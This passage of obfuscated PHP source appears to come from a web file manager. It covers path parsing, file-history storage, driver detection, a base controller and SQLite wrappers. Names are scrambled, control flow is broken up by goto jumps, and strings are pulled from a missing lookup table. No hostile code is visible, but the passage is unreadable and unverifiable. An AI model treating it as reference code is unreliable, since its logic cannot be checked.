$a‚ôÌéå«Û =& $GLOBALS[$E‡¯ÉĞ³‹[7]]; $dáåğÊÖòí = isset($a‚ôÌéå«Û[$E‡¯ÉĞ³‹[1115]]) && $a‚ôÌéå«Û[$E‡¯ÉĞ³‹[1115]] == 1; if (isset($a‚ôÌéå«Û[$E‡¯ÉĞ³‹[29]]) && $a‚ôÌéå«Û[$E‡¯ÉĞ³‹[29]] == $E‡¯ÉĞ³‹[1153]) { return IO::fileOutImage($A‚¨îó†Õ[$E‡¯ÉĞ³‹[76]], $a‚ôÌéå«Û[$E‡¯ÉĞ³‹[1154]]); } IO::fileOut($A‚¨îó†Õ[$E‡¯ÉĞ³‹[76]], $dáåğÊÖòí, get_path_this($CÀÛ‰öí×‰)); } public static function listData($f›¦«ĞíÄ, $aØÌÊß¯ = true) { goto A®Å•‘¨”Ï; fÇÛÄ´Ù‹: $f…İÄĞÊ‘„ = IO::getContent($C¢‡«ÚÂİ‚[$CéïŠ°ø³†[1152]]); if ($f…İÄĞÊ‘„) { $DØ¾öçÖŸ = json_decode($f…İÄĞÊ‘„, !0); if (is_array($DØ¾öçÖŸ)) { $C¢‡«ÚÂİ‚[$CéïŠ°ø³†[367]] = $DØ¾öçÖŸ; } } return $C¢‡«ÚÂİ‚; goto EÃİ¦Ë¾‡Ş; FÅÄ…¶ÌŠ: if (substr($f›¦«ĞíÄ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $eàÒğ¢ç¬ = self::pathHistory($f›¦«ĞíÄ); $C¢‡«ÚÂİ‚ = array($CéïŠ°ø³†[1152] => $eàÒğ¢ç¬ . $CéïŠ°ø³†[1139], $CéïŠ°ø³†[1151] => rtrim(get_path_father($eàÒğ¢ç¬), $CéïŠ°ø³†[8]) . $CéïŠ°ø³†[8], $CéïŠ°ø³†[367] => array()); goto fÇÛÄ´Ù‹; A®Å•‘¨”Ï: $CéïŠ°ø³† =& $_SERVER[ä°„ä°º]; if ($aØÌÊß¯ && !IO::exist($f›¦«ĞíÄ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto FÅÄ…¶ÌŠ; EÃİ¦Ë¾‡Ş: } private static function saveData($dÌœ×­çö‰, $d¶ØµìÓÒÜ) { goto B¬“ìÑ¶™é; B¬“ìÑ¶™é: $a´¥™Ö­æ¿ =& $_SERVER[ä°„ä°º]; self::log($a´¥™Ö­æ¿[1155] . $dÌœ×­çö‰ . $a´¥™Ö­æ¿[68] . count($d¶ØµìÓÒÜ), $a´¥™Ö­æ¿[735]); if ($d¶ØµìÓÒÜ) { return IO::setContent($dÌœ×­çö‰, json_encode($d¶ØµìÓÒÜ)); } goto Aè”ñÅ‰ï¡; cº ê¦†ƒÃ: return !0; goto c°±…É‰Ö‹; Aè”ñÅ‰ï¡: $e—ôäÕŸĞ = IO::pathFather($dÌœ×­çö‰); IO::remove($dÌœ×­çö‰); self::clearEmptyFolder($e—ôäÕŸĞ); goto cº ê¦†ƒÃ; c°±…É‰Ö‹: } public static function clearEmptyFolder($cêö¸†ğÏ†) { goto E¬ÀŞ”êõô; BÏ‡­»¨ƒ: self::clearEmptyFolder($dãĞ¯áØÏÕ); goto d«Å¿š†È”; bâ¸ÔÕŞ¶„: $BØƒÖĞ£Õº = IO::has($cêö¸†ğÏ†, !0); if ($BØƒÖĞ£Õº[$F‰åÅÖÒÛÖ[203]] > 0 || $BØƒÖĞ£Õº[$F‰åÅÖÒÛÖ[204]] > 0) { return; } IO::remove($cêö¸†ğÏ†); goto BÏ‡­»¨ƒ; E¬ÀŞ”êõô: $F‰åÅÖÒÛÖ =& $_SERVER[ä°„ä°º]; if (trim($cêö¸†ğÏ†, $F‰åÅÖÒÛÖ[8]) == trim(self::$_historyBase, $F‰åÅÖÒÛÖ[8])) { return; } $dãĞ¯áØÏÕ = IO::pathFather($cêö¸†ğÏ†); goto bâ¸ÔÕŞ¶„; d«Å¿š†È”: } private static function getBasePath() { goto a±‡«İÓ¯; f¸Ô˜Àµ‘Ö: $a¡É„Šö¹ = DATA_PATH . $CŸ¸Ùˆ‚Ÿ[1158] . rand_string(8) . $CŸ¸Ùˆ‚Ÿ[8]; $a¡É„Šö¹ = IO::mkdir($a¡É„Šö¹); $a¡É„Šö¹ = rtrim($a¡É„Šö¹, $CŸ¸Ùˆ‚Ÿ[8]) . $CŸ¸Ùˆ‚Ÿ[8]; goto fÑ±–«Ëà²; fÑ±–«Ëà²: file_put_contents($a¡É„Šö¹ . $CŸ¸Ùˆ‚Ÿ[1159], $CŸ¸Ùˆ‚Ÿ[33]); file_put_contents(DATA_PATH . $CŸ¸Ùˆ‚Ÿ[1159], $CŸ¸Ùˆ‚Ÿ[33]); Model($CŸ¸Ùˆ‚Ÿ[1156])->set($CŸ¸Ùˆ‚Ÿ[1157], $a¡É„Šö¹); goto fâ“ä‘²·; a±‡«İÓ¯: $CŸ¸Ùˆ‚Ÿ =& $_SERVER[ä°„ä°º]; $a¡É„Šö¹ = Model($CŸ¸Ùˆ‚Ÿ[1156])->get($CŸ¸Ùˆ‚Ÿ[1157]); if ($a¡É„Šö¹) { if (!IO::exist($a¡É„Šö¹)) { IO::mkdir($a¡É„Šö¹); } if (get_path_this($a¡É„Šö¹) == $CŸ¸Ùˆ‚Ÿ[1142]) { $CÑ¶íµ‚»³ = $CŸ¸Ùˆ‚Ÿ[1158] . rand_string(8); @rename($a¡É„Šö¹, get_path_father($a¡É„Šö¹) . $CŸ¸Ùˆ‚Ÿ[8] . $CÑ¶íµ‚»³); $a¡É„Šö¹ = DATA_PATH . $CÑ¶íµ‚»³ . $CŸ¸Ùˆ‚Ÿ[8]; file_put_contents(DATA_PATH . $CŸ¸Ùˆ‚Ÿ[1159], $CŸ¸Ùˆ‚Ÿ[33]); Model($CŸ¸Ùˆ‚Ÿ[1156])->set($CŸ¸Ùˆ‚Ÿ[1157], $a¡É„Šö¹); } return $a¡É„Šö¹; } goto f¸Ô˜Àµ‘Ö; fâ“ä‘²·: return $a¡É„Šö¹; goto Dø¦‰¢ˆ¨; Dø¦‰¢ˆ¨: } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\x65\x63\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\163\x65\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\162\x46\151\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\106\x69\154\x65\124\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\157\165\x70\x52\x6f\x6f\x74\123\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\x68\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\123\150\141\162\145\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\141\x72\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\111\x74\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\x49\x74\x65\155\114\x69\156\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\x72\143\x68\175"; const KOD_BLOCK = "\173\142\x6c\x6f\143\153\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\x52\145\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\x76\145\x72\x7d"; public static function typeList() { $bÄÀº°Ö…‘ =& $_SERVER[ä°„ä°º]; return array($bÄÀº°Ö…‘[1160] => self::KOD_SOURCE, $bÄÀº°Ö…‘[1161] => self::KOD_USER_RECYCLE, $bÄÀº°Ö…‘[1162] => self::KOD_USER_FAV, $bÄÀº°Ö…‘[1163] => self::KOD_USER_FILE_TAG, $bÄÀº°Ö…‘[1164] => self::KOD_USER_FILE_TYPE, $bÄÀº°Ö…‘[1165] => self::KOD_GROUP_ROOT_SELF, $bÄÀº°Ö…‘[1166] => self::KOD_USER_SHARE, $bÄÀº°Ö…‘[1167] => self::KOD_USER_SHARE_LINK, $bÄÀº°Ö…‘[1168] => self::KOD_USER_SHARE_TO_ME, $bÄÀº°Ö…‘[1169] => self::KOD_SHARE_ITEM, $bÄÀº°Ö…‘[1170] => self::KOD_SHARE_LINK, $bÄÀº°Ö…‘[1171] => self::KOD_SEARCH, $bÄÀº°Ö…‘[1172] => self::KOD_BLOCK, $bÄÀº°Ö…‘[1173] => self::KOD_IO, $bÄÀº°Ö…‘[1174] => self::KOD_USER_RECENT, $bÄÀº°Ö…‘[1175] => self::KOD_USER_DRIVER); } public static function parse($FôÓö´æùİ) { goto AÑš³Î—’; e¾ÙÚåæÉ: $C°ˆË½¥šÃ = array($f²‹¼¼ŒÁ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[1141]] = in_array($e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[29]], $C°ˆË½¥šÃ); return $e†Ö‹ ¦˜; goto A’ïš’ŠÅ¨; c‹êØÒ›ß: preg_match($f²‹¼¼ŒÁ[1176], $FôÓö´æùİ, $a£Óµ«îÊÚ); $e†Ö‹ ¦˜ = array($f²‹¼¼ŒÁ[415] => !1, $f²‹¼¼ŒÁ[1177] => !1, $f²‹¼¼ŒÁ[412] => !1, $f²‹¼¼ŒÁ[76] => $FôÓö´æùİ, $f²‹¼¼ŒÁ[1086] => !1, $f²‹¼¼ŒÁ[1085] => $f²‹¼¼ŒÁ[33]); if (is_array($a£Óµ«îÊÚ) && count($a£Óµ«îÊÚ) == 5) { $EÑè«²öÌ = $f²‹¼¼ŒÁ[1178] . $a£Óµ«îÊÚ[2] . $f²‹¼¼ŒÁ[325]; if (in_array($EÑè«²öÌ, $bğÍ¦—¦¿¿)) { $e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[1086]] = $a£Óµ«îÊÚ[1]; $e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[29]] = $EÑè«²öÌ; $e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[1179]] = substr($EÑè«²öÌ, 1, -1); $e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[393]] = $a£Óµ«îÊÚ[3]; } $e†Ö‹ ¦˜[$f²‹¼¼ŒÁ[1085]] = $a£Óµ«îÊÚ[4]; } goto e¾ÙÚåæÉ; AÑš³Î—’: $f²‹¼¼ŒÁ =& $_SERVER[ä°„ä°º]; $FôÓö´æùİ = self::clear($FôÓö´æùİ); $bğÍ¦—¦¿¿ = array_values(self::typeList()); goto c‹êØÒ›ß; A’ïš’ŠÅ¨: } public static function isTruePath($fñ‘‰¼÷ê‚) { goto A¦°Î°ˆ; A¦°Î°ˆ: $CÛ×Î×ÏÆ¶ =& $_SERVER[ä°„ä°º]; if (substr($fñ‘‰¼÷ê‚, 0, 1) != $CÛ×Î×ÏÆ¶[1178]) { return !0; } if (strpos($fñ‘‰¼÷ê‚, $CÛ×Î×ÏÆ¶[401]) === 0) { return !0; } goto Fåô´ø×¥; Fåô´ø×¥: if (strpos($fñ‘‰¼÷ê‚, $CÛ×Î×ÏÆ¶[1145]) === 0) { return !0; } if (strpos($fñ‘‰¼÷ê‚, $CÛ×Î×ÏÆ¶[1180]) === 0) { return !0; } if (strpos($fñ‘‰¼÷ê‚, $CÛ×Î×ÏÆ¶[1181]) === 0) { return !0; } goto fğóš–; fğóš–: if (strpos($fñ‘‰¼÷ê‚, $CÛ×Î×ÏÆ¶[1182]) === 0) { return !0; } return !1; goto f¬¬ßêØ‘°; f¬¬ßêØ‘°: } public static function clear($bæ—À†¼„) { goto e¡è´ö·•; cò·ã¡Òê¦: return $bæ—À†¼„; goto DĞ¯¸×Ö¥—; AÜ’Ï¦‹¸ï: $Dº×“¡ƒõó = $a³“‹†„ì[1183]; if (substr($bæ—À†¼„, 0, 3) == $a³“‹†„ì[1184]) { $bæ—À†¼„ = substr($bæ—À†¼„, 3); } while (strstr($bæ—À†¼„, $Dº×“¡ƒõó)) { $bæ—À†¼„ = str_replace($Dº×“¡ƒõó, $a³“‹†„ì[8], $bæ—À†¼„); } goto aÒ¤•Ù¿ƒ; e¡è´ö·•: $a³“‹†„ì =& $_SERVER[ä°„ä°º]; $bæ—À†¼„ = str_replace(array($a³“‹†„ì[1059], $a³“‹†„ì[229]), $a³“‹†„ì[50], $bæ—À†¼„); $bæ—À†¼„ = str_replace($a³“‹†„ì[97], $a³“‹†„ì[8], $bæ—À†¼„); goto AÜ’Ï¦‹¸ï; aÒ¤•Ù¿ƒ: $bæ—À†¼„ = preg_replace($a³“‹†„ì[1185], $a³“‹†„ì[8], $bæ—À†¼„); if ($bæ—À†¼„ == $a³“‹†„ì[8]) { return $a³“‹†„ì[8]; } $bæ—À†¼„ = rtrim($bæ—À†¼„, $a³“‹†„ì[8]); goto cò·ã¡Òê¦; DĞ¯¸×Ö¥—: } public static function sourceID($C×Èªµ‚²) { $D©ç›¬†¤‘ =& $_SERVER[ä°„ä°º]; $fè‹¸èö® = self::parse($C×Èªµ‚²); if ($fè‹¸èö®[$D©ç›¬†¤‘[29]] !== self::KOD_SOURCE) { show_json(LNG($D©ç›¬†¤‘[1186]), !1); } return $fè‹¸èö®[$D©ç›¬†¤‘[393]]; } public static function make($a¥–åÏ¼ïô) { if (!$a¥–åÏ¼ïô) { return !1; } return self::makePath(self::KOD_SOURCE, intval($a¥–åÏ¼ïô)); } public static function makeShare($cˆØ°àÁìÏ, $DëÒÅƒŒ÷Û) { return self::makePath(self::KOD_SHARE_ITEM, $cˆØ°àÁìÏ, $DëÒÅƒŒ÷Û); } public static function makeFileTypePath($c„…‘ŠŞ§Æ) { return self::makePath(self::KOD_USER_FILE_TYPE, $c„…‘ŠŞ§Æ); } public static function makeFileTagPath($Bì¸‡ÒŠ²) { return self::makePath(self::KOD_USER_FILE_TAG, $Bì¸‡ÒŠ²); } public static function makePath($eªğƒ¥¶Ì, $aãËÔšÆµ = '', $EãÓ™ŸéÖ = '') { $CŒËÍğ˜ç =& $_SERVER[ä°„ä°º]; $CÕîÌå©ğ— = substr($eªğƒ¥¶Ì, 1, -1); $e½ˆ“Î­ÇÑ = $CŒËÍğ˜ç[1187] . $CÕîÌå©ğ— . $CŒËÍğ˜ç[1188] . $aãËÔšÆµ . $CŒËÍğ˜ç[1189]; $e½ˆ“Î­ÇÑ = $EãÓ™ŸéÖ ? $e½ˆ“Î­ÇÑ . $EãÓ™ŸéÖ . $CŒËÍğ˜ç[8] : $e½ˆ“Î­ÇÑ; return $e½ˆ“Î­ÇÑ; } public static function hashPath($a×®„‡Óš÷, $eÒÕï¡™«” = true) { goto Eª ù»¾¾É; c¥ëçƒÓ¶: if (!$CêÕÈéµƒ³ && isset($døÇ´©°›[$bÓµÄÒù¯[395]])) { $døÇ´©°› = IO::info(KodIO::make($døÇ´©°›[$bÓµÄÒù¯[395]])); $CêÕÈéµƒ³ = _get($døÇ´©°›, $bÓµÄÒù¯[1190], $bÓµÄÒù¯[33]); } if (!$CêÕÈéµƒ³ && $eÒÕï¡™«”) { $d¸®è„†›á = KodIO::parse($døÇ´©°›[$bÓµÄÒù¯[76]]); if (!$d¸®è„†›á[$bÓµÄÒù¯[29]]) { $CêÕÈéµƒ³ = IO::hashSimple($døÇ´©°›[$bÓµÄÒù¯[76]]); } } if (!$CêÕÈéµƒ³) { $CêÕÈéµƒ³ = md5($døÇ´©°›[$bÓµÄÒù¯[76]] . $døÇ´©°›[$bÓµÄÒù¯[78]] . $døÇ´©°›[$bÓµÄÒù¯[84]]); } goto FÂ–ƒŞÔô„; Eª ù»¾¾É: $bÓµÄÒù¯ =& $_SERVER[ä°„ä°º]; $døÇ´©°› = is_array($a×®„‡Óš÷) ? $a×®„‡Óš÷ : IO::info($a×®„‡Óš÷); $CêÕÈéµƒ³ = _get($døÇ´©°›, $bÓµÄÒù¯[1190], $bÓµÄÒù¯[33]); goto c¥ëçƒÓ¶; FÂ–ƒŞÔô„: return $CêÕÈéµƒ³; goto FåÔçóà³ç; FåÔçóà³ç: } public static function initSystemPath() { goto CÌ³Ş¢‚ƒ¡; bµÅêŒ«: define($DáâÇ¸Á‘[1193], self::systemPath($DáâÇ¸Á‘[1194])); define($DáâÇ¸Á‘[1195], self::systemPath($DáâÇ¸Á‘[1196])); define($DáâÇ¸Á‘[1197], self::systemPath($DáâÇ¸Á‘[1198])); goto A–ÅâÁ¢Ç; A–ÅâÁ¢Ç: IOHistory::bindEvent(); goto A´Ã˜ñÁâº; CÌ³Ş¢‚ƒ¡: $DáâÇ¸Á‘ =& $_SERVER[ä°„ä°º]; if (defined($DáâÇ¸Á‘[1191])) { return; } define($DáâÇ¸Á‘[1191], self::systemPath($DáâÇ¸Á‘[1192])); goto bµÅêŒ«; A´Ã˜ñÁâº: } public static function systemPath($AÙ·¬§•óİ) { goto dËãÓÁˆ”¬; CâØ·õ©ˆ: return $d´¡É¼ù”œ; goto dã¶ë„¤; dËãÓÁˆ”¬: $BùŞ¶¬Ü‘Â =& $_SERVER[ä°„ä°º]; $AÅ¯‘ä† = $BùŞ¶¬Ü‘Â[1199] . ucfirst($AÙ·¬§•óİ); $d´¡É¼ù”œ = Model($BùŞ¶¬Ü‘Â[753])->get($AÅ¯‘ä†); goto c¨°êìùšŸ; c¨°êìùšŸ: if ($d´¡É¼ù”œ) { return $d´¡É¼ù”œ; } if ($AÙ·¬§•óİ == $BùŞ¶¬Ü‘Â[1192]) { $d´¡É¼ù”œ = self::make(Model($BùŞ¶¬Ü‘Â[813])->systemRootPathAdd($BùŞ¶¬Ü‘Â[518])); } else { $d´¡É¼ù”œ = self::systemPath($BùŞ¶¬Ü‘Â[1192]); $D¤¡´„ßíŸ = self::sourceID($d´¡É¼ù”œ); $d´¡É¼ù”œ = self::make(Model($BùŞ¶¬Ü‘Â[813])->mkdir($D¤¡´„ßíŸ, $AÙ·¬§•óİ)); } Model($BùŞ¶¬Ü‘Â[753])->set($AÅ¯‘ä†, $d´¡É¼ù”œ); goto CâØ·õ©ˆ; dã¶ë„¤: } public static function systemFolder($f‘Š¡‘â”Œ) { $C’»•¦ÃŒé = IO_PATH_SYSTEM_SOURCE . $f‘Š¡‘â”Œ; $CÁâœÓàì = Cache::get($C’»•¦ÃŒé); if (!$CÁâœÓàì) { $d®‘éµÜà¬ = IO::infoFull($C’»•¦ÃŒé); if (!$d®‘éµÜà¬) { $CÁâœÓàì = IO::mkdir($C’»•¦ÃŒé, REPEAT_SKIP); } else { $CÁâœÓàì = $d®‘éµÜà¬[$_SERVER[ä°„ä°º][76]]; } Cache::set($C’»•¦ÃŒé, $CÁâœÓàì, 3600 * 10); } return $CÁâœÓàì; } public static function defaultDriver() { return Model($_SERVER[ä°„ä°º][750])->defaultDriver(); } public static function defaultIO() { $EƒÉÛÃÊ™ =& $_SERVER[ä°„ä°º]; $E‹ßÁåŒØë = self::defaultDriver(); return $EƒÉÛÃÊ™[1200] . $E‹ßÁåŒØë[$EƒÉÛÃÊ™[393]] . $EƒÉÛÃÊ™[1189]; } public static function defaultDriverInit() { static $dË¢„«®‡ò = false; if ($dË¢„«®‡ò) { return $dË¢„«®‡ò; } $dË¢„«®‡ò = IO::init(self::defaultIO()); return $dË¢„«®‡ò; } public static function fileTypeList() { $EÏõ¿­ =& $_SERVER[ä°„ä°º]; $CÙËÙ™‚ğ´ = $GLOBALS[$EÏõ¿­[6]][$EÏõ¿­[1201]]; foreach ($CÙËÙ™‚ğ´ as $A£ãáğÌÒ¿ => $Fİ…ğ‚óÌ) { $eöİ‰Ù‹¤œ = $EÏõ¿­[1202] . $A£ãáğÌÒ¿; $BÇ¢ï ‚Ÿ˜ = LNG($eöİ‰Ù‹¤œ); if ($eöİ‰Ù‹¤œ != $BÇ¢ï ‚Ÿ˜) { $CÙËÙ™‚ğ´[$A£ãáğÌÒ¿][$EÏõ¿­[28]] = $BÇ¢ï ‚Ÿ˜; } } return $CÙËÙ™‚ğ´; } public static function transferType($E÷Ó£ĞÉšŒ, $c«Ş®ˆ‰Öò) { goto eíêŒÏ†ˆ; aíÛïƒ²ƒù: return $B’©•ôò«Â[1205]; goto CãèÓÑÇ¤; cŞƒíÂÉá¦: if ($d’á•¼éé¯[$B’©•ôò«Â[29]] == $b›ÛÛÕÀØÕ[$B’©•ôò«Â[29]] && $d’á•¼éé¯[$B’©•ôò«Â[1203]] == $b›ÛÛÕÀØÕ[$B’©•ôò«Â[1203]]) { return $B’©•ôò«Â[1204]; } if ($d’á•¼éé¯[$B’©•ôò«Â[29]] == $B’©•ôò«Â[853] && $b›ÛÛÕÀØÕ[$B’©•ôò«Â[29]] == $B’©•ôò«Â[106]) { return $B’©•ôò«Â[1115]; } if ($d’á•¼éé¯[$B’©•ôò«Â[29]] == $B’©•ôò«Â[106] && $b›ÛÛÕÀØÕ[$B’©•ôò«Â[29]] == $B’©•ôò«Â[853]) { return $B’©•ôò«Â[107]; } goto aíÛïƒ²ƒù; eíêŒÏ†ˆ: $B’©•ôò«Â =& $_SERVER[ä°„ä°º]; $d’á•¼éé¯ = self::driverType($E÷Ó£ĞÉšŒ); $b›ÛÛÕÀØÕ = self::driverType($c«Ş®ˆ‰Öò); goto cŞƒíÂÉá¦; CãèÓÑÇ¤: } public static function driverType($cÄ‹†Ş‚†î) { goto cÌâÇ‚Ü…•; CƒçŠâßæ‹: if ($A—Ë§ôì½Å == $D¶åº¬®ƒ†[741] || $A—Ë§ôì½Å == $D¶åº¬®ƒ†[1207] || $A—Ë§ôì½Å == $D¶åº¬®ƒ†[1208]) { $cÄ‹†Ş‚†î = self::defaultDriverInit(); } else { if ($A—Ë§ôì½Å == $D¶åº¬®ƒ†[1122] || $A—Ë§ôì½Å == $D¶åº¬®ƒ†[1209]) { $cÄ‹†Ş‚†î = IO::init($cÄ‹†Ş‚†î->pathParse[$D¶åº¬®ƒ†[1069]]); } } $A—Ë§ôì½Å = str_replace($D¶åº¬®ƒ†[1206], $D¶åº¬®ƒ†[33], strtolower($cÄ‹†Ş‚†î->getType())); if ($A—Ë§ôì½Å == $D¶åº¬®ƒ†[106]) { return array($D¶åº¬®ƒ†[29] => $D¶åº¬®ƒ†[106], $D¶åº¬®ƒ†[1203] => $D¶åº¬®ƒ†[33], $D¶åº¬®ƒ†[76] => $F»Í§Š¡ñù); } goto aù…°Âö‹ë; cÌâÇ‚Ü…•: $D¶åº¬®ƒ† =& $_SERVER[ä°„ä°º]; $F»Í§Š¡ñù = $cÄ‹†Ş‚†î->path; $A—Ë§ôì½Å = str_replace($D¶åº¬®ƒ†[1206], $D¶åº¬®ƒ†[33], strtolower($cÄ‹†Ş‚†î->getType())); goto CƒçŠâßæ‹; aù…°Âö‹ë: return array($D¶åº¬®ƒ†[29] => $D¶åº¬®ƒ†[853], $D¶åº¬®ƒ†[1203] => $cÄ‹†Ş‚†î->pathDriver, $D¶åº¬®ƒ†[76] => $F»Í§Š¡ñù); goto DÓ»â÷Á®¤; DÓ»â÷Á®¤: } } goto CÕ£®½¤´; f¦ÍÔÉßç: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto c¢¾¸ß…‚; c¢¾¸ß…‚: $D®äÈ„‰ÍĞ =& $_SERVER[ä°„ä°º]; global $in, $config; $this->config =& $config; goto d‹Şéö®í±; d‹Şéö®í±: $this->in =& $in; $this->values[$D®äÈ„‰ÍĞ[6]] =& $config; $this->values[$D®äÈ„‰ÍĞ[7]] =& $in; goto eÒ®¶ñŒ«; eÒ®¶ñŒ«: $this->tpl = TEMPLATE . MOD . $D®äÈ„‰ÍĞ[8]; $this->_classObjectID = mt_rand(0, 10000); goto EäµÙÛ»Ç³; EäµÙÛ»Ç³: } public function loadClass($Bã—›Ø‰ì) { if (1 === func_num_args()) { $this->{$Bã—›Ø‰ì} = new $Bã—›Ø‰ì(); } else { $fº«Ú›¼¤ = new ReflectionClass($Bã—›Ø‰ì); $F‹é»Ì¶ò‘ = func_get_args(); array_shift($F‹é»Ì¶ò‘); $this->{$Bã—›Ø‰ì} = $fº«Ú›¼¤->newInstanceArgs($F‹é»Ì¶ò‘); } return $this->{$Bã—›Ø‰ì}; } protected function assign($B÷£ª©‚½¬, $f³Î ½¶Œ) { $this->values[$B÷£ª©‚½¬] = $f³Î ½¶Œ; } protected function display($AÎ§ğÄõï) { ob_end_clean(); extract($this->values); require $this->tpl . $AÎ§ğÄõï; } } class DbSqliteBase extends Db { public function __construct($Côí¦ÉË…‘ = '') { $F¶À±•’Ìë =& $_SERVER[ä°„ä°º]; if (!extension_loaded($F¶À±•’Ìë[9])) { think_exception(think_lang($F¶À±•’Ìë[10]) . $F¶À±•’Ìë[11]); } if (!empty($Côí¦ÉË…‘)) { if (!isset($Côí¦ÉË…‘[$F¶À±•’Ìë[12]])) { $Côí¦ÉË…‘[$F¶À±•’Ìë[12]] = 438; } $this->config = $Côí¦ÉË…‘; if (empty($this->config[$F¶À±•’Ìë[13]])) { $this->config[$F¶À±•’Ìë[13]] = array(); } } } public function connect($F‘èÇ½ë¸ = '', $e¿Á¯ÒÈñç = 0) { $b¾¿›¡ùÜ› =& $_SERVER[ä°„ä°º]; if (!isset($this->linkID[$e¿Á¯ÒÈñç])) { goto C½¶œ½±«Ä; BóÓ®ÎÔàâ: $this->linkID[$e¿Á¯ÒÈñç] = $aïŸ¡Ñ§‹š($F‘èÇ½ë¸[$b¾¿›¡ùÜ›[17]], $F‘èÇ½ë¸[$b¾¿›¡ùÜ›[12]]); if (!$this->linkID[$e¿Á¯ÒÈñç]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto F·Ú„›§˜; C½¶œ½±«Ä: if (empty($F‘èÇ½ë¸)) { $F‘èÇ½ë¸ = $this->config; } $B„î„Íì‡¯ = !empty($F‘èÇ½ë¸[$b¾¿›¡ùÜ›[13]][$b¾¿›¡ùÜ›[14]]) ? $F‘èÇ½ë¸[$b¾¿›¡ùÜ›[13]][$b¾¿›¡ùÜ›[14]] : $this->pconnect; $aïŸ¡Ñ§‹š = $B„î„Íì‡¯ ? $b¾¿›¡ùÜ›[15] : $b¾¿›¡ùÜ›[16]; goto BóÓ®ÎÔàâ; F·Ú„›§˜: @sqlite_busy_timeout($this->linkID[$e¿Á¯ÒÈñç], 30000); if (1 != think_config($b¾¿›¡ùÜ›[18])) { unset($this->config); } goto CÇó©®ìµ; CÇó©®ìµ: } return $this->linkID[$e¿Á¯ÒÈñç]; } public function free() { $this->queryID = null; } public function query($FãÉ‡›É Ë) { goto e—ÙˆÕÃŒ¶; b¥‡ñ”°°: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $bÙì¨Ôğô‘ = $this->getAll(); return $bÙì¨Ôğô‘; } goto eœ£ìĞ‘Ë; b†Ìƒ¿ÃÔ: think_status($Bó¥ïâªğ[20]); $this->queryID = sqlite_query($this->_linkID, $FãÉ‡›É Ë); $this->debug(); goto b¥‡ñ”°°; fáË³Éˆì»: $this->queryStr = $FãÉ‡›É Ë; if ($this->queryID) { $this->free(); } think_action_status($Bó¥ïâªğ[19], 1); goto b†Ìƒ¿ÃÔ; e—ÙˆÕÃŒ¶: $Bó¥ïâªğ =& $_SERVER[ä°„ä°º]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fáË³Éˆì»; eœ£ìĞ‘Ë: } public function execute($F”ˆğª•”) { goto Eˆ­óÎÄÈ’; d®Û†¼ÚÉ : think_status($DÚ¸µÆí[20]); $fª—‰ÊøÖ· = sqlite_exec($this->_linkID, $F”ˆğª•”); $this->debug(); goto f´±Ô…×æ¦; FªµİÑ¤ìˆ: $this->queryStr = $F”ˆğª•”; if ($this->queryID) { $this->free(); } think_action_status($DÚ¸µÆí[21], 1); goto d®Û†¼ÚÉ ; Eˆ­óÎÄÈ’: $DÚ¸µÆí =& $_SERVER[ä°„ä°º]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FªµİÑ¤ìˆ; f´±Ô…×æ¦: if (!1 === $fª—‰ÊøÖ·) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto fĞïÂ§åö; fĞïÂ§åö: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ä°„ä°º][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dµëĞ­Ê¹Ş = sqlite_query($this->_linkID, $_SERVER[ä°„ä°º][23]); if (!$dµëĞ­Ê¹Ş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cìÆ²½ñ“‚ = sqlite_query($this->_linkID, $_SERVER[ä°„ä°º][24]); if (!$cìÆ²½ñ“‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dÌ…­«æË = array(); if ($this->numRows > 0) { for ($fšªµ­¨‘ = 0; $fšªµ­¨‘ < $this->numRows; $fšªµ­¨‘++) { $dÌ…­«æË[$fšªµ­¨‘] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $dÌ…­«æË; } public function getFields($AÃ“ğ§¿šë) { $A¹Â‰øÂ² =& $_SERVER[ä°„ä°º]; $E§÷’Øéè« = $this->query($A¹Â‰øÂ²[25] . $AÃ“ğ§¿šë . $A¹Â‰øÂ²[26]); $b¯ƒ¦èÁª = array(); if 